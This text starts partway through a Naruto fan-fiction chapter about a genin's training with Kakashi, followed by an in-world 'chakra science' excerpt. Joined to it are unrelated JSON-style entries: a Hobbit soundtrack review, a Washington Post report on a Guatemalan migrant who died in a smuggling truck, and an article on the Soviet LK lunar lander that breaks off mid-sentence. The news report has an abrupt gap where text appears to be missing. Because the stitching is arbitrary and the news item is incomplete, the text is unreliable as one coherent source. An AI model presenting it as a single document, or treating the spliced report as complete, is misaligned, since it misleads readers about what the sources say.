test your various capabilities and see where our efforts are best applied. I've also got some fire techniques which I think would benefit your combat style.\"\n\nShe shrugged.\n\n\"Have you been working on anything else?\" Kakashi asked.\n\nShe opened her mouth as if to reply, then stopped, her gaze flickering briefly at me. \"Nothing important, no.\"\n\nGreat, she's working on something else, I thought sourly. That's awesome.\n\nKakashi seemed to accept Izanami's statement at face value, though. He just nodded at her, then looked at me. I perked up.\n\n\"What you should be doing depends a lot on the direction you want to take,\" he said. \"You've got talent with seals, and Iruka's notes said that your chakra control is on a rare level. From what I've seen so far, I agree with him. You could specialize in genjutsu, but with Izanami in the team that might prove superfluous in the short-term.\"\n\nNo, really? I thought.\n\n\"You could also plan to enlist as a medic-nin once you're done with field duty and train to supplement that,\" he said.\n\nI frowned in thought. Genjutsu was definitely out, yes. Medic-nin, though? There was an idea I'd never honestly considered. Healing people actually sounded nice - it was all about fixing stuff, and that I could get on board with.\n\n\"You said you wanted to help people,\" Kakashi added, \"and your chakra control means you would make a terrific medic-nin. As far as I can see, it looks like the best option for you.\"\n\nIt sounded nice, yes. \"Medic-nin aren't allowed to take part in direct combat if they can avoid it, though, right?\" I asked.\n\nKakashi nodded. \"That's part of the oath Senju Tsunade demanded of all of Konoha's medic-nin, yes. Even with her gone, they still swear it. I thought you might consider it an added benefit.\"\n\nMy eyes narrowed a bit at that last comment, but I held my tongue. I'd read about the oath of the medic-nin somewhere, and couldn't recall the details, but I could recall that it was very restrictive. When you were a medic-nin, you were supposed to heal and help people, and nothing else. Tsunade, one of Konoha's three great Sannin and arguably the person who had invented the formalized profession of the medic-nin, had been extremely clear on that point.\n\nAnd while that sounded nice, too, I had my doubts as to how sensible a philosophy that truly was. Besides, techniques and skills that were suited to be a medic-nin were fundamentally not suited for combat, no matter which oaths I would or would not eventually swear, and that... was a problem.\n\nI was quiet for a few seconds while I considered that, before I finally spoke. \"Actually, I think I'd like to start working on my earth affinity. And if you've got time later, I've got a few questions about seals that could get a little involved.\"\n\nKakashi frowned. \"Elemental techniques are chakra intensive, and learning an affinity can take quite a while.\"\n\n\"All the more reason to get started earlier. Besides, I tend to learn techniques very fast. That should be in the notes as well.\"\n\n\"Are you sure?\" Kakashi asked. \"I really think becoming a medic-nin would be a better choice for you, overall.\"\n\n\"I can always change my mind later,\" I said. \"For now, yeah, I'm sure.\"\n\nKakashi looked doubtful. \"You'll be practicing a few other basics besides that, then - I suppose that goes for all of you. As for the rest, I'll answer the questions I can-later, when we've seen what you can do. I also know some people higher up in the academy faculty. Maybe I can get you access to some of the level two or three scrolls and books on the subject.\"\n\nI smiled. \"That would be great.\"\n\n\"In that case, I'll see what I can do.\" He stood up and clapped his hands once. \"Okay! Let's get to work.\"\n\nTraining was less immediately draining than I'd expected. Perhaps Kakashi had realized that we - or at least, I - were already drained from an entire day of trying to keep order in a drunken crowd. He was being... well, gentle was really the wrong word - non-psychotic might fit better. I was likely just comparing it to the way it had been when he was testing us. Now we could set our own pace while we were paired up and he was working with one alone. He'd set us to trying to pull off substitutions with each other in quick succession to train our coordination and familiarity.\n\nIt was a tricky maneuver, since the technique had to be applied from both sides at once. Also, substituting yourself with something that had chakra was extremely difficult - even a non-sentient pig or a febrile old man was at least a few dozen times harder to substitute with forcibly than a dead log. Substitution involved lacing the target with your own chakra as a way to, for lack of a better word, anchor yourself as the technique pulled you through space. Naturally, that was much harder when the target was already seeped with its own chakra, however slight.\n\nAt first, I was paired up with Izanami. I had my doubts as to how that would work out, but neither of us actually acknowledged what had passed between us earlier in the slightest. Working with her was a clinical experience; we kept it professional and impersonal, which suited me fine. We agreed on a given set of maneuvers and locations and general timing, and then we simply went ahead and did that.\n\nIronically, with Izanami the technique worked so smoothly I hardly even noticed I was substituting myself for a living being with its own chakra and not an inert rock. I wasn't sure what that said about Izanami, but I couldn't fault her chakra control. I screwed up only once, slipping off a tree branch after substituting with her had left me with a bad footing. The slightly superior smirk she sent me when I rubbed a bruised calf said it all. I grit my teeth and concentrated harder, barreling stubbornly through the tiredness that plagued me. I didn't screw up again.\n\nWhen it came turn to pair with Naruto, it was much harder than I'd expected. His chakra control was truly horrendous, at least compared to mine. His preferred way of doing things when in a hurry, it seemed, was to just shunt more chakra at the technique until it aligned to what he wanted. When cooperating, though, such an approach was far more detrimental than anything else.\n\n\"I even have trouble doing some of the simpler chakra exercises sometimes,\" he admitted to me, looking embarrassed and scratching the back of his head. \"It's like, you've got scalpels while I'm trying to do surgery with a sledgehammer or something.\"\n\n\"At least it's a very big sledgehammer,\" I panted, and leaned on a tree to recuperate from our latest attempted switcheroo. By being forced to try and counter-balance the enormous amounts of chakra he was using, I was tiring myself out very quickly.\n\n\"I do have an idea though,\" he said. \"Let's try this instead. Just keep standing there and don't do anything.\"\n\nI raised an eyebrow in inquiry. He quickly formed the five hand-seals for the substitution technique and paused on the last, an aura of faint blue suddenly engulfing him. My hair stood on end; I could feel it from over here - no, wait. His chakra linked to mine as he tried to affect the substitute, and then it swept mine completely aside like a stray leaf in a hurricane before I could even react.\n\nIn the blink of an eye, my body was awash with foreign chakra. The burning sensation completely overwhelmed me for a timeless moment, and then it was over and I was somehow on my hands and knees, gasping for breath. There was a faint, buzzing tingling all over and I felt very jittery, as if every single nerve in my entire body had spazzed out at once.\n\n\"Woah, you okay?\" came Naruto's voice. I looked up at him running over to me and became aware that I was where he'd been standing before.\n\n\"Warn me when you do that next time,\" I gasped, then sat back and took a few deep breaths. \"That was pretty overwhelming.\"\n\nNaruto frowned. \"Probably not the best idea, though, if it does that to you.\"\n\n\"You've never tried that with Izanami before?\"\n\nHe shrugged. \"Never had to. We don't have any problem cooperating like this, syncing up chakra.\"\n\nI frowned, for a second. \"Then why is it so hard for us?\"\n\nHe grinned, letting himself plop down into the grass beside me. \"It's probably her cheat codes, you know.\"\n\n\"Her what?\" I asked, then immediately felt stupid. \"Oh.\"\n\nHer Sharingan's chakra perception would give her a keen knowledge of what the counterpart was doing and how to supplement that and adjust her own technique to fit. The perfect tool for delicate teamwork, handed to her on a silver platter.\n\nNaruto's grin widened, seeing my now sour face. \"Yeah, I know the feeling. Those eyes really are scarily useful. I'm glad she's on our side.\"\n\n\"Her brother isn't.\"\n\nNaruto's grin disappeared. \"No, he isn't.\" He put on a tight smile. \"But it's not like we'll ever have to fight him, right?\"\n\nI frowned at him, then blinked and looked away to hide my reaction. He didn't mean that. Does he actually expect to meet Uchiha Itachi?\n\n\"She's not the only one born with a lot of advantages, though, is she?\" I asked in an absent tone, trying to change the topic while my mind was processing that sudden revelation. I looked back at him, indicating clearly who I was talking about.\n\n\"What do you mean?\" he asked, a little defensively.\n\n\"It's really not normal to be able to throw out the amounts of chakra you do. And you don't tire easily either. What is it, some kind of obscure bloodline limit?\"\n\nHe opened his mouth. \"Uuhhhhmm...\" He grinned while scratching the back of his head, his gaze flickering from side to side as if looking for someone to extricate him from me. \"Well...\"\n\n\"So you can't tell me about it,\" I said, and sighed. \"Figures.\"\n\n\"Well...\" he said hesitantly. \"I'd really rather not.\"\n\nI frowned. \"That makes it sound like it's embarrassing, not like it's a village secret.\" My lips twitched. \"What, it's like ninja hemorrhoids or something?\"\n\nHe half-snorted, half-chuckled, and held up his hands. \"No, no, nothing like that, thank the gods.\" He paused, then relented. \"Well, okay maybe a little bit, only... not totally gross.\"\n\nMy eyes narrowed and I glanced sharply over at Izanami, currently sparring furiously with Kakashi in a blurry taijutsu-only display of speed and acrobatics that went almost too fast to follow.\n\n\"She knows,\" I said.\n\nNaruto said nothing for a while, then sighed. \"Yeah, she does.\"\n\nI looked at him again, and he looked back with a surprisingly annoyed expression, one I'd never seen on him before.\n\n\"Look,\" he said. \"Could you not push it? Please?\"\n\nI blinked, my mouth continuing on without me before I had a chance to think about it. \"Sure. Sorry.\"\n\nHe shrugged. \"It's okay.\" He stood up and offered me a hand. \"Come on - let's not let Kakashi see us have too much of a breather.\"\n\nWith a small, absentminded nod of assent, I let him help me up, and we began again. The things Naruto had said had me distracted, though, and in the end we didn't even manage to pull off a proper two-way substitution before the next swap. I was the last person Kakashi pulled over.\n\nMostly, the session with Kakashi passed with demonstrations, mapping out with him exactly which techniques I knew and how well I could control them. How fast could I prepare a substitution when being distracted? Could I body flicker and retain my old momentum? While leaving behind clone images? And dragging wire? Or excluding certain parts of my gear when I substituted, so I could leave behind nasty surprises without even using my hands? Could I internalize the seal when I body flickered so I didn't have to use my hands, or even just manage to do it with one hand?\n\nAnd on it went; Kakashi's list of demanded feats was long - most of them I couldn't quite pull off, since I'd never tried before, but there were a few of them that I actually managed to do, when I really took the time to concentrate. Not that that would ever be acceptable in battle, but you could always get faster once you had the basics down.\n\nOnce I was breathing heavily from the exertion, Kakashi decided to test my chakra control. He had me try a variation of the common leaf exercise, where instead of using chakra to stick leaves to various parts of my body while doing several things at once, I had to stick sand to the palm of my hands or my forehead or wrists or feet in highly specific patterns like circles or squares and keep it there. Then he wanted me to change the patterns around without losing any grains of sand. Then he upped the amount of patterns I should try to maintain. Then he wanted me to-\n\n\"Excuse me?\" I asked, sitting on the ground with my legs crossed, tired and sweaty. Sand fell down my face as I lost hold of the latest exercise - trying to keep a small sphere of sand cohesive and balanced on the bridge of my nose. It was getting in my clothes and sandals, chafing, and I was really beginning to get tired of Kakashi's progressively more insane demands. I could feel my chakra coils aching from the day's exertions.\n\n\"Try to see if you can make it float apart from your skin,\" Kakashi said again. \"That is, without it actually touching the skin.\"\n\nFor a moment, I said nothing, shooting him a slightly sullen glance. He didn't even seem to notice it. Then, with a heavy sigh, I got to work.\n\nI touched my finger to the ground and stuck a layer of sand to the tip, then held it up before my eyes and frowned at it. Manipulating something as fine and porous as sand was tricky. Sticking a layer of it to my skin was easy enough, and controlling how much it stuck in different places to form patterns was doable, if difficult. Changing the patterns had demanded that I actually use my chakra to push the sand around, delicately, without losing any of it. It was kind of like cradling it in a small envelope of chakra that you then shaped to your needs. This was just the logical extension of that.\n\nThe small patch of sand on my finger slowly bunched together in a single clump. I narrowed my eyes, and it took on a slightly more spherical shape, resting on the tip. Then I tried to gently push it off and the entire thing broke apart. I huffed with frustration.\n\nUnequal pressure, I told myself. Concentrate and try again.\n\nKakashi watched me attentively. It took me four more tries before I had a tiny sphere of sand floating half a centimeter above my finger.\n\n\"How far out can you go?\" he asked.\n\nI tried a little more, pushing it out slowly. One centimeter, two, three, five, seven... the distance from my finger began to make shaping the chakra close to impossible. At around ten, the sphere broke apart and I released a pent-up breath I hadn't realized I'd been holding. \"No more than that,\" I said, taking a deep breath and sitting back. \"This is tiring.\"\n\n\"That's really pretty impressive,\" Kakashi said. \"I know jounin who can't push that exercise so far.\"\n\n\"My endurance really isn't much to speak of, though,\" I said, though I had to keep a small smile off of my face.\n\n\"It's not a matter of how much force you apply.\" Kakashi held up a kunai and tapped the tip of it. \"But of how you apply it. Your low capacity does cripple your technique selection somewhat, but I,\" he tapped his forehead protector which hid his Sharingan, \"know a lot of techniques. You've more than assuaged my main worry, which is that of how fast you should be able to learn techniques. I think I can have you using some very basic earth techniques reliably in a couple of months.\"\n\n\"Wait, I thought that was supposed to take years?\"\n\nHe shrugged, sticking his hands in his pockets. \"Sure, that's what they tell the second and third and fourth-graders, and even some of the firsts.\" His gaze fell on me, a wry glint in his eyes. \"But then, that's not us, is it?\"\n\nI grinned faintly, a feeling of elation coursing through me. \"I guess not.\"\n\nAnd then the feeling faded as quickly as it came, as I realized that a few months wasn't quite fast enough to actually help against Izanami. Well... no matter, I supposed. I hadn't counted on it, certainly - I just knew that learning affinities took intense training with your chakra, which was bound to increase my capacity and control which would be useful enough on its own.\n\nIf I kept Izanami believing that I was working on an affinity so I could match her, while I was actually concentraing mostly on some other thing that she wouldn't see coming... maybe that could work out. I'd need to sit down, later, and really think this through. When I first stumbled on the idea for the exploding scrolls, after all, it had felt very hopeless too, after the first few dozen failed attempts.\n\nBesides, I thought, who's to say I can't learn it faster than he thinks I can?\n\n\"If you can get a decent repertoire of earth techniques, achieve the near-perfect control of the clone, body flicker, transformation and substitution techniques that I think you can, and with maybe the slight addition of some basic genjutsu tricks and, of course, some support from your fanciful seal-work, I think you can fill out a very capable support role for our team,\" Kakashi said. \"People always underestimate how valuable the basic techniques are when they become as natural as breathing. It's not the big, splashy techniques that make the ninja, after all-try finding a jounin who hasn't fully mastered those four basic techniques and I can guarantee you that you'll be looking at more graves than anything else.\"\n\nI thought about that. Not a glorious role, compared to a front-line heavy-hitter like Naruto or a budding taijutsu and genjutsu master like Izanami, not to speak of when you combined the two, but... I could read between the lines of what he'd just said, I thought.\n\nThe corner of my lip turned up ever so slightly. \"I'll take it.\"\n\n\"Of course you will.\"\n\nThat evening at home, I sat at my desk at the small workshop in my room, nursing a cup of tea. I'd apologized to dad for not being home on time-apparently I hadn't gotten home until four-and I'd just barely avoided an argument with him about the black eye. I'd endured dinner, finished doing the dishes, taken a really long shower, and then, finally, I had gotten to retreat to my room, to be with myself and my thoughts, and, most importanly, with my pen and paper.\n\nI sipped my tea while I tried to make heads and tails of the complete and utter mess my notes had been left in. Kakashi had been much more thorough than I realized at the time - not a single piece of paper had been left unturned and not a single drawer hadn't been rifled through. Nothing was in its proper place, but at least nothing had been broken either - if it had been, I really would have had words with Kakashi.\n\nAs it was, it wasn't too much effort to track down a few pieces of blank paper and a pen and clear a small space to work in. I chewed idly on the pen as I stared at the blank piece of paper. It was rare that I wrote anything useful down when I did this, but the blank piece of paper somehow always helped set the thoughts flowing. It wasn't working as well tonight as it usually did, though; the headache hadn't completely passed yet, not even now. The inky and faintly charred smell of my workshop wasn't really helping either, even if I normally found it comforting.\n\nWith a sigh, I got up and walked over to open the window and get a breath of the fresh evening air; perhaps that would clear my head a bit. I leaned on the windowsill and peered up at the darkening sky, the day having given way to murky twilight a while ago. A wave of fatigue swept over me as I stood there - I probably really should get a solid night's sleep. A calm breeze ruffled the leaves of the nearby trees and blew gently past me. I stood there for a bit, then closed the window again and rubbed my face tiredly.\n\nEven having just aired out my room, the faint scent of chakra ink still hung in the air. I sighed, giving it up for naught and went back to my desk, picking the pen up and chewing on it. Maybe I wouldn't have any strokes of genius tonight, but it always helped to sit and chew on a problem just before I slept. I would sit here until I'd exhausted the topic as thoroughly as I felt I could, as I'd done so many other times before, and only then would I sleep.\n\nIn the end, it took hours before I went to bed.\n\nCHAPTER END\n\nWhile great progress has been made in the chakra sciences during the past century, any experienced practitioner will tell you that the amount of known mysteries far outstrips the amount of known facts, and that every discovered clue unveils a dozen new questions. Any genuine expert in the field will state that the only thing they know for sure is that they don't know much.\n\nPerhaps the most well-known example is this: It has during the last century become an accepted fact that energy in a closed system is limited, quantifiable and subject to the laws of entropy in almost all cases. Almost, that is, apart from with chakra techniques. This was suggested by the famous experiments performed by Mao Nanyue, who demonstrated that the energy a powerful practitioner receives from the food he eats is not sufficient to provide energy for the techniques he is consistently capable of performing.\n\nNor is there a sufficient dip in ambient chakra levels to explain this discrepancy as the ninja drawing in energy from his immediate surroundings (rather, the ambient levels of chakra rose considerably during the experiment). Other experiments were also performed, such as studying the effects of fasting on chakra replenishment and total capacity (limited, but still significant).\n\nThe only explanation, Mao posited, is that there exists some external, extra-dimensional \"source\" from which chakra is drawn. This, he states, would also explain how creatures which are simply physical expressions of pure chakra (lesser to greater demons and devas, the tailed beasts which arguably might fit under such qualifications, as well as many others) can possibly exist. Apart from his experiments*, however, there is little proof of this theory and it remains one of the largest open questions in the field of chakra science.\n\nProgress in the field, compared to the other sciences which have seen a boom this past century, has been seen as slow. Undoubtedly, one of the major reasons for this is secrecy. Advanced chakra techniques are primarily used by ninja, samurai and temple monks, all groups which guard the secret workings of their powers jealously, from outsiders and from each other. In a more literal sense than usual, here, knowledge is power.\n\nAnother issue is that, perhaps due to the heavily militarized and mysticism-laced nature of the field, there is a lack of a certain attitude of mind. While it is premature to call the ninja of today archaic, it is perhaps appropriate to call them excessively practical. A theory is not necessarily given high regard, unless it is easily translated into newer, more efficient ways of waging war on the enemy. Thus, the past century of scientific growth and the emergence of the paradigms of reproducibility and peer review fit ill with the fundamentally antagonistic and suspicious ninja mindset.\n\n* It should be noted that several possible flaws in Mao Nanyue's experiments have been pointed out by later scientists, who, despite the experiments' reproducibility, are reluctant to draw the same conclusions, if any, regarding the nature and origin of chakra, instead opting simply to admit: \"We don't know what's happening, or why.\"\n\n—Ryuuzaki Leiko, \"Chakra Sciences in the new century\", Excerpt of Article pp. 5-11, Science Illustrated Magazine Issue 97 - \"The World of Chakra\"\n\nAs a general rule, reviews make authors happy.

  "latent_31849": "JW Reviews the New Hobbit Soundtrack\n\nat 6:57 am by December 10, 20136:57 am by celedor\n\nJ.W. here. Today the second Hobbit soundtrack by Howard Shore has been released, which to me makes this day the equivalent of Christmas morning. As I said in my book, The Lord of the Films, I believe Shore’s music for The Lord of the Rings is the finest film score of all time. And the music for the first Hobbit movie? You can read my thoughts about that one here.\n\nBut now it’s time for The Hobbit: The Desolation of Smaug: Original Motion Picture Soundtrack. And here is my track by track analysis for the Special Edition, with one asterisk indicating a track not available in the Standard Edition and two asterisks indicating a track that has been extended. As of this writing, I’ve not yet seen the film it scores. So away we go!\n\nDISC 1\n\n1. The Quest for Erebor (3:23)\n\nFull of sadness and mystery, this track is reminiscent of the prologue music in the previous films and serves as somewhat an overture, introducing the main themes. It leads right into the next track…\n\n2. Wilderland (4:56)\n\nThis could be called “The Quest for Erebor Part II”. It picks up the tempo in the second half, creating a sense of urgency and danger with its percussion driving the brass and strings. Definitely a good one!\n\n3. A Necromancer (2:54) *\n\nDescending broken thirds mean you know who. (Actually the familiar Sauron theme is buried within the texture here, though it peeks through the surface from time to time.) Obviously this is one of those evil themes, with rumbling brass and high strings being Shore’s music of choice for such occasions.\n\n4. The House of Beorn (4:52) **\n\nThis low key and mysterious piece isn’t very memorable. It’s sort of “A Necromancer Part II”, with more of what we just heard in the previous track.\n\n5. Mirkwood (5:31) **\n\nLike the forest itself, this dark, creepy piece serves its title well, using a choral backing to set the mood. It’s sort of The Hobbit’s version of “The Paths of the Dead”.\n\n6. Flies and Spiders (9:35) **\n\nThis one is very Star Wars like! It begins somewhat heartwarmingly before getting going, and then it’s like John Williams scoring a space battle, with the violins flying around their E strings and working the sixteenth notes. Curiously the Smaug motif appears here as well, brief but memorable. Overall, it’s one of the standout tracks of the album.\n\n7. The Woodland Realm (5:15) **\n\nThis begins with the familiar choral backing we’ve come to associate with the Elves, with the texture reminiscent of Rivendell and Lothlórien but also new and different. It quickly becomes dark and dangerous, however, playing out even more creepy than Lothlórien, which suits the forest it is in.\n\n8. Feast of Starlight (2:48)\n\nDark and somber, yet uplifting all the same, this piece is highlighted by solo woodwinds and a female voice. and is quite beautiful. It reminds me of “Aníron” from The Fellowship of the Ring. Curiously, the history of the Ring theme works its way into the end.\n\n9. Barrels Out of Bond (1:50)\n\nFull of staccato and anticipation, this little number is the audio equivileant of the question “What’s going to happen next?!” It doesn’t last long, but what’s here is exciting.\n\n10. The Forest River (5:10) **\n\nWhat happens next is a brisk tempo, with excitement in every note. This one is sure to be a crowd pleaser, with a spirit of adventure so bold, you could mistake it for the film’s climax. The piece builds throughout before a thrilling, percussive finale.\n\n11. Bard, a Man of Lake-town (3:18) **\n\nSomewhat anticlimactic after the last piece, this is dark and somber and pure filler.\n\n12. The High Fells (3:38) **\n\nThe circular strings that introduce this piece create a lofty sense of anticipation before a creepy voice works its way in and out, creating a sense of mystery and suspense that’s heightened by tremolo strings. It’s not the most memorable piece, but it’s one of my favorites.\n\n13. The Nature of Evil (3:20)\n\nThis is highly reminiscent of the black riders chasing Frodo in The Fellowship of the Ring, with low rumbling evil themes and high strings that will make you scream, “Get orf the Road!” It picks up momentum as it continues and becomes jarring.\n\n14. Protector of the Common Folk (3:37)\n\nThis lighter fare works its way into a little string jig. It comes across as a harmless, filler track.\n\nDISC 2\n\n1. Thrice Welcome (3:34)\n\nThis rhythmic piece works its way into the familiar chromatic theme from the Unexpected Party, though it mostly just dances around a new, short descending motif.\n\n2. Girion, Lord of Dale (4:15) **\n\nDark and somber (like much of the album) there’s a majestic quality here that reminds me of the Argonath.\n\n3. Durin’s Folk (3:04) **\n\nA standout. Building into a force of Middle-earth, this piece features a rare use of distortion by Shore. With its boldness and self importance, you can almost see the Lonely Mountain as you listen to it.\n\n4. In the Shadow of the Mountain (2:15)\n\nThis reflective (and short) piece starts off sprite and fun before getting dark and moody.\n\n5. A Spell of Concealment (3:22) **\n\nWith screeching strings and a feeling of anticipation, there’s no mistaking this one for anything but a dangerous, evil piece. Sauron’s themes (including Barad-dûr) return in full force as the track works its way into a frenzy.\n\n6. On the Doorstep (7:46)\n\nAs you can imagine, this track is filled with anticipation and wonder, though a lot of it is low key and mellow. Still, it’s quite pretty and one I could listen to over and over.\n\n7. The Courage of Hobbits (3:00)\n\nBeginning with the Shire motif, this gets dark and mysterious in a hurry, working in a chiming gamelan. This leads us to…\n\n8. Inside Information (3:48)\n\n… which begins with more of the same before working its way into the Smaug theme. The track is a marvel, unlike anything Shore has done in Middle-earth before and quite frankly knocked my hobbit shoes off. It weaves together its themes and instruments in a unique way to create a sense of awe and wonder.\n\n9. Kingsfoil (2:25)\n\nOne of the few warm, heartlifting pieces, “Kingsfoil” includes a female voice and is quite comforting, a refuge from the more frightening pieces of the soundtrack.\n\n10. A Liar and a Thief (3:41)\n\nReturning to low brass and high strings, there’s no doubt what’s going on here: anger and rage building itself into a terror. Shore takes his time, not rushing a single note, and the result is JW ducking for cover by the end.\n\n11. The Hunters (9:55) **\n\nCombining several different themes, this pulse raising adventure track will go on my ipod in my workout playlist. Backed by a recurring percussive rhythm, the piece is full of suspense and danger.\n\n12. Smaug (6:29) **\n\nIt’s curious that Tolkien didn’t use “Smaug” as a chapter title (opting instead for “Inside Information”). I realize he didn’t want to give away any of the story with the chapter list at the beginning of the book, but a Smaug chapter is a foregone conclusion from the beginning. Personally, I think “Smaug” as a title would have a simplistic beauty, like “Mount Doom” in Return of the King. Ah well, the soundtrack uses both titles!\n\nThis track is not quite as memorable as “Inside Information”, but gets going towards the end and builds towards something powerful, with percussion and voices in overdrive mode.\n\n13. My Armor Is Iron (5:16)\n\nThis is just an extension of the previous track, with more of the same and a resolution. (Actually, I think I like this one more, because it’s more to the point.)\n\n14. I See Fire (5:00)\n\nEd Sheeran sings this one well, but I can’t say I like the song as much as Neil Finn’s “Song of the Lonely Mountain”. (The fans on youtube sure like it, however, so what do I know?) It’s a fine song on its own (and lends itself to covers), but I’m not sure it makes me think “Hobbit”. It’s more bluesy than the other closing songs. Then again, I’m sure some people find it a nice change of pace.\n\n15. Beyond the Forest (5:27)\n\nOh, this one is pretty. A female voice opens it up, and it develops into a somber run through of the film’s themes.\n\nClosing Thoughts:\n\nI must say that this album wasn’t what I was expecting. It’s better! It knew it would be darker than the first Hobbit soundtrack, but I didn’t think it would be so different and so rich. The Smaug theme, which recurs throughout, is the standout, perfectly capturing the awe and wonder of the dragon. But there’s something more. There’s a build and development in the music, almost like a story in itself, that is lacking in the first Hobbit soundtrack. By the latter half of the second disc, I’m listening not only to hear the beauty of the music, but to hear what happens next. There’s a sense of urgency and importance that I couldn’t turn away from. Is there some filler? Yes, particularly early. But overall, I couldn’t be more happy with what Shore has done here. Now I just have to see the movie!",

  "latent_32016": "(Monica Akhtar/The Washington Post)\n\nOne of the undocumented immigrants who died in a stifling tractor-trailer here Saturday was a 19-year-old who grew up in Northern Virginia and graduated from a Fairfax County high school before getting in trouble with the law and being deported to his native Guatemala, according to court records and government officials.\n\nHe was sneaking back into the United States.\n\nFrank G. Fuentes was one of at least six Guatemalans packed into a poorly ventilated truck with scores of other migrants who had crossed the border illegally, said Cristy Andrino, the consul of Guatemala in McAllen, Tex.\n\nFrank G. Fuentes was born in Guatemala but lived most of his life in the United States before being deported in March. He was one of 10 undocumented immigrants killed in an overheated tractor-trailer on Saturday in Texas. (Family photo)\n\nU.S. Immigration and Customs Enforcement said Fuentes had been brought to this country before his third birthday and was deported on March 2 after being convicted of assault and battery by a mob. He was suspected of having ties to Mara Salvatrucha, the deadly street gang also known as MS-13.\n\nThe truck driver, James Matthew Bradley Jr., has been charged with smuggling immigrants for financial gain resulting in death after the vehicle became dangerously overheated, killing 10 people and injuring 29 others in one of the worst cross-border smuggling disasters in recent history.\n\nIn addition to Fuentes, Andrino said, two Guatemalans were taken from the truck for medical treatment: a 17-year-old male, who remained hospitalized in stable condition as of Tuesday; and a 23-year-old man, who is a witness and has been released and transferred to some form of protective custody.\n\n“They’re relieved that they survived,” Andrino said. “They didn’t know the risks they were facing.”\n\nThe two told authorities that they crossed into the United States from Mexico through a desert zone near Laredo, Tex., the Guatemalan foreign ministry said, and boarded a truck that they expected to take them to Houston. Three other Guatemalans were also on the truck, in addition to Fuentes and the two others who were found alive, the statement said. Their whereabouts are unknown.\n\nMexico’s government said Wednesday that 34 of the 39 people taken off the truck were Mexican nationals, including seven of the dead, according to a preliminary review. Most are still hospitalized. Dozens of others on the truck fled or were driven away before authorities arrived.\n\nFuentes, who presented himself on Facebook as an aspiring rap singer, died of “heat exposure and asphyxiation,” the Guatemalan government said.\n\nHis Facebook page, which was tagged with condolence messages Tuesday, said that he graduated from J.E.B. Stuart High School in Fairfax County in 2015.\n\n“He brought so much positivity to so many people,” said Kelly Barrios-Mazariegos, who grew up with Fuentes and attended high school with him. “Every time you would tell him there was a problem or something, he would giggle, and he would say we would figure it out.”\n\nBut online records from Fairfax County Circuit Court show that Fuentes pleaded guilty to simple assault and battery by a mob, and grand larceny­/pickpocketing, in March 2016. That July, Fuentes was arrested by federal agents, ICE said in a statement. His deportation was ordered in February.\n\nWhen Barrios-Mazariegos last spoke to Fuentes on Snapchat a month ago, she said, he confided how much he was struggling in an unfamiliar country. “He’s been here forever,” she said. “He doesn’t know what Guatemala was. His home is here, his friends are here, his family is here.”\n\nBarrios-Mazariegos has set up a GoFundMe page for Fuentes’s family.

His permission to stay expired June 5, 2016. He applied to renew it but “was discretionarily denied, based on a number of public safety concerns,” the agency said.\n\nAnother former classmate, Juan Benitez, said he and Fuentes grew up in the Culmore neighborhood and worked together at a Domino’s. Fuentes later worked in construction and took classes at Northern Virginia Community College, Benitez said. The two young men would work on cars together and talked about making a career in cars. Benitez pushed back on the government’s allegation that his friend was in a gang.\n\n“Growing up where we grew up, it was just easier for the government to label him as a statistic and say that he was affiliated with a gang,” said ­Benitez. “Growing up in a rough neighborhood we stayed away from people like that.

  "latent_32021": "The LK-3 test article (left) on display at London’s Science Museum, next to a Lunokhod model. (credit: D. Day) Giant steps are what you take, walking on the Moon\n\nIf there is an infinite number of universes, then certainly in one of them Alexei Leonov climbed down the ladder of the Soviet Lunniy Korabl (“lunar ship”) and put his bootprint on the surface of the Moon. But Leonov did not take such a step in our universe and, as a result, the Soviet effort to beat the Americans to the Moon is largely forgotten. Had the Soviets ever gotten that far, had they ever sent Leonov to the Moon, he would have died rather than eventually become a genial geriatric cosmonaut, ambassador of the Soviet space program, and living legend. That was my thought when looking at the ungainly and rickety LK-3 test article on display at London’s Science Museum a few weeks ago. It is the second time that a lunar landing craft has ever ventured outside of Russia (one was displayed at EuroDisney in Paris in the 1990s), and will probably be the last time for many, many years to come. Had the Soviets ever gotten that far, had they ever sent Leonov to the Moon, he would have died rather than eventually become a genial geriatric cosmonaut, ambassador of the Soviet space program, and living legend. In some ways, my trip was a pilgrimage, an homage. The special exhibit, “Cosmonauts: Birth of the Space Age,” closed yesterday (see “Review: Cosmonauts: Birth of the Space Age”, The Space Review, December 7, 2015). It was a fascinating display of Soviet-era space equipment, the largest single display outside of Russia. Starting today, if you want to see a good collection of Russian space equipment without going to Moscow, your best bet is probably to go to the United States, either to the Smithsonian’s National Air and Space Museum in Washington, DC, or the Kansas Cosmosphere. The Smithsonian has a flown Soyuz capsule, a mockup, an enigmatic TKS spacecraft, a space suit, and even a Venera Venus orbiter as well as numerous smaller items. The Cosmosphere has a number of relatively minor artifacts, but does a great job putting them in the context of the space race with the Americans. The London exhibit was many years in the making and delayed by bureaucracy and threatened by politics, but it eventually happened. According to one of the museum’s curators, who gave a public talk at the museum in late February, many of the artifacts on display were not from public Russian museums but from museums or collections within Russian aerospace companies or technical institutes. Those organizations tend to view their artifacts from a more “commercial perspective” than is common in the West, a polite way of saying that they wanted to be compensated for loaning them abroad and were not doing so out of good will or the interests of cultural outreach. The curator explained that the large objects in the exhibit—specifically the crewed spacecraft—presented difficult logistics challenges. One problem was that Valentina Tereshkova’s spacecraft’s heat shield includes asbestos and part of it had been crushed, meaning that the asbestos could become airborne. The London museum curators had to travel to Russia to encapsulate the capsule for transport, donning protective clothing and respirators for the job, which mystified their Russian counterparts, who do not consider asbestos to be a hazardous material. Simply getting the large artifacts into the museum was not easy, and they practiced moving Tereshkova’s capsule through the museum by using a large inflatable beach ball. The Lunniy Korabl is one of only five engineering mockups built, each one different than the others. LK-3 is the most complete one of those five. The LK looks top-heavy and more awkward than its distant American relative, the larger Grumman Lunar Module. The landing sequence for the LK was risky, involving a “crasher stage” that would slow the craft down just above the surface before being jettisoned by the lone cosmonaut inside. At that point the pilot had only about sixty seconds to land before having to abort—using the same engine for both descent and ascent. Apollo 11 Lunar Module Pilot Buzz Aldrin noted that if that engine failed “they were splattered.” There was no backup engine. The margin for error was nonexistent. Alexei Leonov, truly a superman among cosmonauts, probably would still be on the surface today if they had tried—and not in one piece. Apollo 11 Lunar Module Pilot Buzz Aldrin noted that if that engine failed “they were splattered.” The margin for error was nonexistent. For students of the Cold War space race, the LK is somewhat of a mystic object. During the 1960s the Soviet leadership never confirmed that they were racing the Americans to the Moon. It was in their nature to be secretive about their space activities, but this secrecy might have been encouraged by the fact that they knew—when their space leaders experienced infrequent moments of clarity—that they were doing badly. Like an Olympic runner who has gotten out of shape, they may not have wanted to admit that 